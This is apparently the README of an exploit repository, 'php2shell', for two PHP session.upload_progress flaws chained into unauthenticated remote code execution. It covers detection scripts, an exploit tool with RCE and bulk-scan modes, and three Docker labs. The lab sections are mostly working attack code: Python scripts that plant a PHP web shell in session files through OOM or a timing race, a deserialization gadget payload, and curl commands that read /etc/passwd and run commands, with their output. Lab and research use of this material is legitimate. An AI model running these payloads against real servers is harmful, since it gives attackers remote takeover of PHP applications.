# php2shell — CVE-2026-109618 / CVE-2026-109619

Pre-auth Remote Code Execution in PHP via `session.upload_progress` abuse.

Two PHP-core vulnerabilities (patched 2026-10-21) that chain
`session.upload_progress` with memory-limit OOM to achieve unauthenticated
RCE on any PHP application — WordPress, Laravel, Drupal, custom code — if the
PHP version is in range and `session.upload_progress.enabled=On` (the default).

This repository contains:

- **Detection tools** — version-based and behavioral (zero-dependency Python)
- **Exploit tool** (`p2s.py`) — unified scanner + multi-strategy RCE
- **Hands-on labs** — three Docker labs for manual practice (OOM+LFI, Race+LFI, Deserialization)
- **Offset profiles** — pre-extracted binary offsets for heap exploitation

> **Authorized use only.** These tools are for authorized penetration testing,
> security research, and CTF/lab practice. Do not use against systems you do not
> have explicit permission to test.

---

## Table of Contents

- [Affected Versions](#affected-versions)
- [The Vulnerability](#the-vulnerability)
- [Repository Structure](#repository-structure)
- [Quick Start](#quick-start)
- [Detection Tools](#detection-tools)
- [Exploit Tool (p2s.py)](#exploit-tool-p2spy)
- [Hands-On Labs](#hands-on-labs)
- [Lab 1: OOM + LFI](#lab-1-oom--session-file-inclusion-port-8801)
- [Lab 2: Race + LFI](#lab-2-race-condition-lfi-port-8802)
- [Lab 3: Deserialization RCE](#lab-3-session-deserialization-rce-port-8803)
- [Key Concepts](#key-concepts)
- [Offset Extraction](#offset-extraction)
- [Requirements](#requirements)

---

## Affected Versions

| Branch | Vulnerable | Fixed in |
|--------|------------|----------|
| 8.5    | ≤ 8.5.11   | 8.5.12   |
| 8.4    | ≤ 8.4.26   | 8.4.27   |
| 8.3    | ≤ 8.3.35   | 8.3.36   |
| 8.2    | ≤ 8.2.34   | 8.2.35   |
| ≤ 8.1  | All        | EOL — no patch available |

**Default-vulnerable:** `session.upload_progress.enabled` defaults to `On` in
every PHP build. No application code needs to opt in — the engine-level handler
fires on any multipart POST with the right field names.

---

## The Vulnerability

### Root Cause

PHP's `session.upload_progress` feature tracks file upload progress by writing
metadata (including the uploaded file's **filename**) into the session file at
`/tmp/sess_<PHPSESSID>`. The attacker controls:

1. The **session ID** (via the `PHPSESSID` cookie)
2. The **filename** (via `Content-Disposition` in the multipart body)
3. The **progress name** (via the `PHP_SESSION_UPLOAD_PROGRESS` form field)

Normally, `session.upload_progress.cleanup=On` (the default) deletes the
progress data from the session file when the upload completes. But:

- **CVE-2026-109618**: Non-file POST fields allocate ~4× their size in PHP's
  zend memory manager. Sending many large non-file fields causes an OOM crash
  (`memory_limit` exceeded) BEFORE the cleanup callback runs. The session file
  persists on disk with attacker-controlled PHP code in the filename field.

- **CVE-2026-109619**: The OOM condition corrupts internal PHP state (the
  session handler's stale pointer is not cleaned up), enabling heap-based
  exploitation via use-after-free.

### Attack Chains

```
┌─────────────────────────────────────────────────────────┐
│              session.upload_progress                      │
│                                                          │
│  Attacker POSTs multipart with:                          │
│   • PHPSESSID=<chosen-id>                               │
│   • PHP_SESSION_UPLOAD_PROGRESS=<name>                  │
│   • filename="<?php system('cmd'); ?>"                  │
│   • 30 × 200KB non-file fields (OOM trigger)            │
│                                                          │
│           ┌──── OOM kills worker ────┐                   │
│           │  cleanup never runs      │                   │
│           │  /tmp/sess_<id> persists │                   │
│           └──────────┬───────────────┘                   │
│                      │                                   │
│     ┌────────────────┼──────────────────┐                │
│     ▼                ▼                  ▼                │
│  Strategy A     Strategy B        Strategy C             │
│  OOM + LFI      Race + LFI       Heap Exploit           │
│  (easiest)      (no OOM needed)   (no LFI needed)        │
│                                                          │
│  Include the     Slow-drip the    Use-after-free on      │
│  session file    upload, race     corrupted session       │
│  via LFI         LFI reads        handler → hijack       │
│  ?page=/tmp/     during upload    control flow            │
│  sess_<id>                                               │
└─────────────────────────────────────────────────────────┘
```

There is also a **deserialization variant** (Lab 3) that requires no LFI at all:
if the target uses `session.serialize_handler=php_serialize` and any page reads
the session with the default `php` handler, the `|` character in the progress
name splits the session data and feeds a serialized gadget to `unserialize()`.

---

## Repository Structure

```
php2shell/
├── README.md                  # this file
├── p2s.py                     # unified scanner + exploit (main tool)
├── detect_php2shell.py        # safe version-based detection (1 GET)
├── detect_behavioral.py       # behavioral detection (no version headers needed)
├── php2shell.py               # godylockz original exploit (mod_php/Apache)
├── php2shell_fpm.py           # FPM-specific exploit variant
├── offsets.py                 # offset extractor for mod_php binaries
├── offsets_fpm.py             # offset extractor for PHP-FPM binaries
├── profiles/                  # pre-extracted binary offset profiles
│   ├── fpm-php-8.1.34.json
│   ├── php-8.3.33-bookworm-amd64.json
│   ├── php-8.3.35-bookworm-amd64.json
│   ├── php-8.4.25-bookworm-amd64.json
│   ├── php-8.4.26-bookworm-amd64.json
│   ├── php-8.5.11-bookworm-amd64.json
│   └── php-lab.json
├── docker/                    # mod_php exploit lab (Apache)
│   ├── docker-compose.yml
│   ├── php.ini
│   ├── apache.conf
│   └── www/
└── labs/                      # session file inclusion practice labs
    ├── verify.py              # automated verifier for all 3 labs
    ├── lab-oom-lfi/           # Lab 1: OOM + LFI → RCE (port 8801)
    ├── lab-race-lfi/          # Lab 2: Race condition + LFI (port 8802)
    └── lab-deser-rce/         # Lab 3: Deserialization RCE (port 8803)
```

---

## Quick Start

### Detection (safe, no exploit payload)

```bash
# Offline — classify a known PHP version
python3 detect_php2shell.py --version 8.3.12

# Live — fingerprint a target's PHP version from headers
python3 detect_php2shell.py --url https://target.example/

# Behavioral — when version headers are hidden
python3 detect_behavioral.py https://target.example/
```

### Exploit (authorized targets only)

```bash
# Scan + auto-detect
python3 p2s.py https://target.example/

# Deep probe (OOM + stale state detection)
python3 p2s.py https://target.example/ --deep

# Attempt RCE
python3 p2s.py https://target.example/ --rce -c 'id;hostname' --allow-remote
```

### Practice Labs

```bash
# Start all 3 labs
cd labs
for d in lab-oom-lfi lab-race-lfi lab-deser-rce; do
  (cd $d && docker compose up -d --build)
done

# Verify they work
python3 verify.py

# Lab URLs:
# Lab 1 — http://localhost:8801  (OOM + LFI)
# Lab 2 — http://localhost:8802  (Race + LFI)
# Lab 3 — http://localhost:8803  (Deserialization)
```

---

## Detection Tools

### detect_php2shell.py — Version-Based Detection

Fingerprints the target's PHP version from `X-Powered-By` headers and
error-page banners. Sends **one normal GET** — no multipart, no payload,
no memory-corruption trigger. Classifies against the patch line.

```bash
# Offline check
python3 detect_php2shell.py --version 8.4.26
# → VULN: 8.4.26 < 8.4.27 (fixed in 8.4.27)

python3 detect_php2shell.py --version 8.4.27
# → SAFE: 8.4.27 >= 8.4.27

# Live fingerprint
python3 detect_php2shell.py --url https://target.example/
python3 detect_php2shell.py --url https://target.example/ --path /info.php
```

### detect_behavioral.py — Behavioral Detection

Works when `expose_php=Off`, `display_errors=Off`, and no version headers are
exposed. Uses a 4-layer behavioral probe:

| Layer | What it does | Risk |
|-------|-------------|------|
| 1 | PHP presence heuristics | None — passive |
| 2 | `session.upload_progress` feature detection | None — standard POST |
| 3 | OOM worker-crash differential | Worker restart (same as any large POST) |
| 4 | Worker stability confirmation | None — repeat of layer 1 |

```bash
# Full 4-layer scan
python3 detect_behavioral.py https://target.example/

# Quick (layers 1-2 only, no OOM probe)
python3 detect_behavioral.py https://target.example/ --quick

# Bulk scanning with proxy
python3 detect_behavioral.py -f targets.txt -o results.jsonl --proxy http://127.0.0.1:8080
```

---

## Exploit Tool (p2s.py)

The unified scanner + exploit. Zero dependencies (Python 3.8+ stdlib only).

### Modes

| Mode | Flag | What it does |
|------|------|-------------|
| Fingerprint | (default) | Version detection + classification |
| Deep probe | `--deep` | OOM crash test + stale-state detection |
| RCE | `--rce` | Multi-strategy RCE attempt |
| Bulk scan | `-f targets.txt` | Parallel fingerprinting |

### RCE Strategies

`p2s.py --rce` tries three strategies in order:

| Strategy | Name | Mechanism | Requirements |
|----------|------|-----------|-------------|
| A | Session LFI | OOM prevents cleanup → LFI includes session file | `post_max_size > memory_limit` + LFI on target |
| B | Race LFI | Slow-drip upload keeps session alive → race LFI | Any body limit + LFI on target |
| C | Heap exploit | Per-build offset UAF → control flow hijack | Matching offset profile with `zif_system` |

```bash
# Auto-detect + assess
python3 p2s.py https://target.example/

# Deep probe
python3 p2s.py https://target.example/ --deep

# RCE with custom command (requires --allow-remote for non-localhost)
python3 p2s.py https://target.example/ --rce -c 'id;hostname' --allow-remote

# Offline version check
python3 p2s.py --version 8.3.12

# Bulk scan
python3 p2s.py -f targets.txt -o results.jsonl --workers 10
```

### Safety Guardrails

- Declines patched PHP versions (override: `--force`)
- Requires `--allow-remote` for non-loopback targets
- Preflight checks Server header

---

## Hands-On Labs

Three Docker labs for learning the exploit chain manually. Each lab teaches a
different attack strategy.

| Lab | Port | PHP | Difficulty | Technique |
|-----|------|-----|------------|-----------|
| 1 | 8801 | 8.1-fpm | Easy | OOM prevents session cleanup → LFI includes session file |
| 2 | 8802 | 8.1-fpm | Medium | Slow-drip upload holds session open → race the LFI |
| 3 | 8803 | 7.4-fpm | Hard | OOM + handler mismatch → gadget deserialization, no LFI needed |

All labs use nginx + PHP-FPM, are fully self-contained, and can run
simultaneously on different ports.

---

### Lab 1: OOM + Session File Inclusion (port 8801)

**Config:** `memory_limit=8M`, `post_max_size=50M`, `client_max_body_size=50m`

**The vulnerability:** A classic Local File Inclusion in `?page=` combined with
a low `memory_limit`. The app includes any file path that passes a weak regex
filter — it blocks special characters but allows absolute paths and `/tmp/`.

#### Attack Steps

1. **Reconnaissance**

   ```bash
   # Confirm LFI exists
   curl http://localhost:8801/?page=/etc/passwd
   # → root:x:0:0:root:/root:/bin/bash ...

   # Check PHP configuration
   curl http://localhost:8801/info.php
   # Look for: memory_limit=8M, session.upload_progress.enabled=On
   ```

2. **Poison the session file**

   Craft a multipart POST with:
   - Cookie: `PHPSESSID=<your-chosen-id>` (e.g., `hackertest01`)
   - Form field: `PHP_SESSION_UPLOAD_PROGRESS=anything`
   - File part with PHP code as the filename:
     `filename="<?php system($_GET['c']); ?>"`
   - **30 non-file form fields**, each ~200KB of padding data

   The 30 large fields allocate ~24MB in zend memory (4× overhead), exceeding
   the 8MB `memory_limit`. The worker OOMs before `session.upload_progress.cleanup`
   can delete the progress data. The session file persists at
   `/tmp/sess_hackertest01` with your PHP code inside.

   ```python
   # Python example (minimal)
   import socket

   sid = "hackertest01"
   bnd = "----exploit"
   php = "<?php system($_GET['c']); ?>"

   body = bytearray()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprobe\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="{php}"\r\nContent-Type: application/octet-stream\r\n\r\nX\r\n'.encode()
   for i in range(30):
       body += f'--{bnd}\r\nContent-Disposition: form-data; name="p{i}"\r\n\r\n'.encode()
       body += b"Z" * 200000 + b"\r\n"
   body += f"--{bnd}--\r\n".encode()

   sock = socket.create_connection(("127.0.0.1", 8801), timeout=30)
   sock.sendall(
       f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {len(body)}\r\n"
       f"Cookie: PHPSESSID={sid}\r\n"
       f"Connection: close\r\n\r\n".encode() + bytes(body)
   )
   # Wait for response (will be 200 or connection reset from OOM)
   ```

3. **Trigger RCE via LFI**

   ```bash
   curl "http://localhost:8801/?page=/tmp/sess_hackertest01&c=id"
   # → uid=33(www-data) gid=33(www-data) groups=33(www-data)

   curl "http://localhost:8801/?page=/tmp/sess_hackertest01&c=cat+/etc/hostname"
   ```

#### Key Lessons

- Non-file form fields stay in `$_POST` zend memory with ~4× overhead. File
  contents go to disk temp files and don't count toward `memory_limit`.
- Use **single quotes** in the PHP payload to avoid breaking the
  `Content-Disposition` double-quote attribute.
- `?page=/etc/passwd` is the quick LFI confirmation — if it works, so will
  `/tmp/sess_*`.

---

### Lab 2: Race Condition LFI (port 8802)

**Config:** `memory_limit=512M`, `post_max_size=50M`, `client_max_body_size=1m`

**The vulnerability:** Same LFI as Lab 1, but the memory limit is too high
(512MB) and the nginx body limit is too low (1MB) to trigger OOM. You must
race the session file instead.

#### Attack Steps

1. **Reconnaissance**

   ```bash
   # Confirm LFI
   curl http://localhost:8802/?page=/etc/passwd

   # Confirm OOM is unreachable
   curl http://localhost:8802/info.php
   # memory_limit=512M — way too high for OOM via 1MB body limit
   ```

2. **Slow-drip upload (Terminal 1)**

   Start a multipart POST that sends the headers normally (with PHP code as
   filename and `PHP_SESSION_UPLOAD_PROGRESS` field), but **drip-feeds the
   file body** very slowly (e.g., 4KB every 50ms). While the upload is
   in-progress, the session file exists with your PHP code.

   ```python
   import socket, time

   sid = "racetest01"
   bnd = "----race"
   php = "<?php system('id'); ?>"

   header = (
       f'--{bnd}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
       f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprobe\r\n'
       f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="{php}"\r\n'
       f'Content-Type: application/octet-stream\r\n\r\n'
   ).encode()
   file_size = 800000  # ~800KB, within 1MB limit
   footer = f"\r\n--{bnd}--\r\n".encode()
   total = len(header) + file_size + len(footer)

   sock = socket.create_connection(("127.0.0.1", 8802), timeout=60)
   sock.sendall(
       f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {total}\r\nCookie: PHPSESSID={sid}\r\n"
       f"Connection: close\r\n\r\n".encode() + header
   )

   # Drip-feed: 4KB every 50ms ≈ 16 seconds total
   for offset in range(0, file_size, 4000):
       sock.sendall(b"A" * min(4000, file_size - offset))
       time.sleep(0.05)  # THIS keeps the session file alive

   sock.sendall(footer)
   sock.close()
   ```

3. **Race the LFI (Terminal 2, simultaneously)**

   ```bash
   # Rapid-fire LFI requests — one will land while the session exists
   while true; do
     curl -s "http://localhost:8802/?page=/tmp/sess_racetest01" | grep -q "uid=" && echo "RCE!" && break
     sleep 0.01
   done
   ```

#### Key Lessons

- This is a classic **TOCTOU race condition**. The window is small (seconds)
  but real.
- `session.upload_progress.cleanup=On` deletes the progress data when the
  upload **completes**. A slow upload keeps it alive.
- Threading or async I/O (one thread uploads, one thread races LFI) is
  more reliable than two terminals.
- May need multiple attempts — the race is probabilistic.

---

### Lab 3: Session Deserialization RCE (port 8803)

**Config:** `memory_limit=8M`, `post_max_size=50M`, PHP **7.4**,
`session.serialize_handler=php_serialize`

**The vulnerability:** A handler mismatch — the session is written with the
`php_serialize` handler (globally configured), but `trigger.php` reads it with
the default `php` handler via `ini_set()`. Combined with a gadget class
(`LogRotator`) that calls `system()` in its `__destruct()` method, this
achieves RCE **without any LFI**.

#### Background: Session Serialization Handlers

PHP has two main session serialization formats:

| Handler | Format | Example |
|---------|--------|---------|
| `php` | `key\|serialized_value` | `visits\|i:3;` |
| `php_serialize` | `serialize($_SESSION)` | `a:1:{s:6:"visits";i:3;}` |

The `|` character means different things to each handler. The `php` handler
treats it as a key/value separator. The `php_serialize` handler treats it as
a literal character inside a string.

#### Attack Steps

1. **Reconnaissance**

   ```bash
   # Check configuration
   curl http://localhost:8803/info.php
   # → session.serialize_handler = php_serialize
   # → memory_limit = 8M

   # Read the app — find the gadget class and the handler mismatch
   curl http://localhost:8803/
   # → LogApp Dashboard, shows php_serialize handler
   ```

2. **Identify the gadget**

   In `index.php`, the `LogRotator` class has:
   ```php
   public function __destruct() {
       if ($this->archive_cmd && $this->logfile) {
           @system($this->archive_cmd);
       }
   }
   ```
   If you can make PHP deserialize a `LogRotator` with a controlled
   `archive_cmd`, it calls `system()` when the object is destroyed.

3. **Identify the handler mismatch**

   `trigger.php` does:
   ```php
   ini_set('session.serialize_handler', 'php');
   session_start();
   ```
   This reads the session file with the `php` handler, which splits on `|`.

4. **Generate the gadget payload**

   ```bash
   # Let PHP tell you the correct serialized form:
   docker exec lab-deser-rce-php-1 php -r '
     class LogRotator { public $logfile; public $archive_cmd; }
     $o = new LogRotator();
     $o->logfile = "/tmp";
     $o->archive_cmd = "id";
     echo serialize($o) . "\n";
   '
   # → O:10:"LogRotator":2:{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:2:"id";}
   ```

   > **Critical:** `LogRotator` is **10** characters → `O:10:`, not `O:11:`.
   > An off-by-one silently breaks `unserialize()` — it returns `false` with
   > no error message. Always let PHP generate the serialized form, or count
   > the class name length very carefully.

5. **Poison the session**

   The `PHP_SESSION_UPLOAD_PROGRESS` field value becomes a KEY in the session
   array. Prepend `|` followed by the serialized gadget:

   ```
   |O:10:"LogRotator":2:{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:2:"id";}
   ```

   This gets written to the session file as (php_serialize format):
   ```
   a:1:{s:N:"upload_progress_|O:10:"LogRotator":2:{...}";a:5:{...progress...}}
   ```

   Send the poison multipart (same as Lab 1, with OOM fields to prevent cleanup):

   ```python
   import socket

   sid = "desertest01"
   bnd = "----deser"
   cmd = "id"
   gadget = f'O:10:"LogRotator":2:{{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:{len(cmd)}:"{cmd}";}}'
   inject = f"|{gadget}"

   body = bytearray()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{inject}\r\n'.encode()
   body += f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="t.bin"\r\nContent-Type: application/octet-stream\r\n\r\nX\r\n'.encode()
   for i in range(30):
       body += f'--{bnd}\r\nContent-Disposition: form-data; name="p{i}"\r\n\r\n'.encode()
       body += b"Z" * 200000 + b"\r\n"
   body += f"--{bnd}--\r\n".encode()

   sock = socket.create_connection(("127.0.0.1", 8803), timeout=30)
   sock.sendall(
       f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
       f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
       f"Content-Length: {len(body)}\r\n"
       f"Cookie: PHPSESSID={sid}\r\n"
       f"Connection: close\r\n\r\n".encode() + bytes(body)
   )
   ```

6. **Trigger deserialization**

   ```bash
   curl http://localhost:8803/trigger.php -b "PHPSESSID=desertest01"
   # → uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

   What happens internally:
   1. `trigger.php` sets the handler to `php` and calls `session_start()`
   2. The `php` handler reads the session file and splits on `|`
   3. Everything after `|` is passed to `unserialize()`
   4. `unserialize()` creates a `LogRotator` object with `archive_cmd="id"`
   5. When the request ends, PHP destroys the object → `__destruct()` fires
   6. `system("id")` executes → RCE

#### Key Lessons

- **Class name length is critical.** `O:10:` not `O:11:` for `LogRotator`.
  `unserialize()` returns `false` on mismatch — no error, just silent failure.
- The `|` in the progress name is the entire attack: `php_serialize` stores
  it literally, `php` handler reads it as a key/value separator.
- PHP's `unserialize()` is **lenient** — it reads one complete value and
  ignores trailing data. The garbage after your gadget doesn't break it.
- This does **NOT work on PHP 8.1+** — they hardened session decode to destroy
  the session on handler mismatch. PHP 7.4 and below are vulnerable.
- **Real-world trigger:** applications where different pages or modules use
  different session handlers (e.g., a legacy admin panel with `php` handler
  alongside a modern app using `php_serialize`).

---

## Key Concepts

### session.upload_progress

When `session.upload_progress.enabled=On` (the default), PHP automatically
tracks file upload progress in the session. No application code opts in. The
session key is `upload_progress_<NAME>` where the name comes from the
`PHP_SESSION_UPLOAD_PROGRESS` form field. The **filename** from
`Content-Disposition` is stored verbatim — this is where attacker code lands.

### OOM as a Primitive

`session.upload_progress.cleanup=On` (default) normally deletes progress data
when the upload finishes. But if the PHP worker crashes from an out-of-memory
condition before cleanup, the poisoned session file persists. This OOM is
trivially achievable:

- **Non-file form fields** stay in `$_POST` as PHP zend memory (~4× overhead)
- **File upload contents** go to disk temp files (don't count toward `memory_limit`)
- 30 fields × 200KB = 6MB data → ~24MB zend allocation → crashes 8MB `memory_limit`

### Session Serialization Handler Mismatch

| Write handler | Read handler | Result |
|--------------|-------------|--------|
| `php_serialize` | `php_serialize` | Normal — `\|` stays inside a string key |
| `php_serialize` | `php` | **Vulnerable** — `php` splits on `\|`, unserializes the rest |
| `php` | `php` | Normal |
| `php` | `php_serialize` | Parse error (no exploit) |

### Gadget Classes

Any PHP class with a dangerous `__destruct()` or `__wakeup()` method is a
potential gadget. Common patterns:
- `system()` / `exec()` / `passthru()` in destructor
- `file_put_contents()` in destructor (write a webshell)
- `include()` / `require()` in destructor (LFI)

Real-world examples: WordPress `WP_HTML_Token`, Laravel `PendingBroadcast`,
Symfony `Process`.

---

## Offset Extraction

For Strategy C (heap exploit), you need binary offsets for the target's exact
PHP build. The `profiles/` directory contains pre-extracted offsets for common
builds.

```bash
# Extract offsets from a mod_php binary
python3 offsets.py /path/to/libphp.so > profiles/my-target.json

# Extract offsets from an FPM binary
python3 offsets_fpm.py /path/to/php-fpm > profiles/my-target-fpm.json

# Use with p2s.py
python3 p2s.py https://target/ --rce --profile profiles/my-target.json
```

---

## Requirements

- **Python 3.8+** — stdlib only, zero `pip install` dependencies
- **Docker** — for the practice labs and offset extraction
- **Target prerequisites:**
  - `session.upload_progress.enabled=On` (default in all PHP builds)
  - `session.upload_progress.cleanup=On` (default)
  - PHP version in the vulnerable range (see table above)
  - Strategy A: `post_max_size > memory_limit` + an LFI vulnerability
  - Strategy B: any body limit + an LFI vulnerability
  - Strategy C: matching offset profile
  - Deserialization: `php_serialize` handler + `php` handler mismatch + gadget class

---

## Cleanup

```bash
# Stop practice labs
cd labs
for d in lab-oom-lfi lab-race-lfi lab-deser-rce; do
  (cd $d && docker compose down)
done

# Stop the mod_php exploit lab
cd docker && docker compose down
```

---

## License

For authorized security testing and educational use only.

## Credits

- CVE-2026-109618 / CVE-2026-109619 original research: [godylockz](https://github.com/godylockz)
- Session file inclusion labs and unified scanner (`p2s.py`): MomoRizza
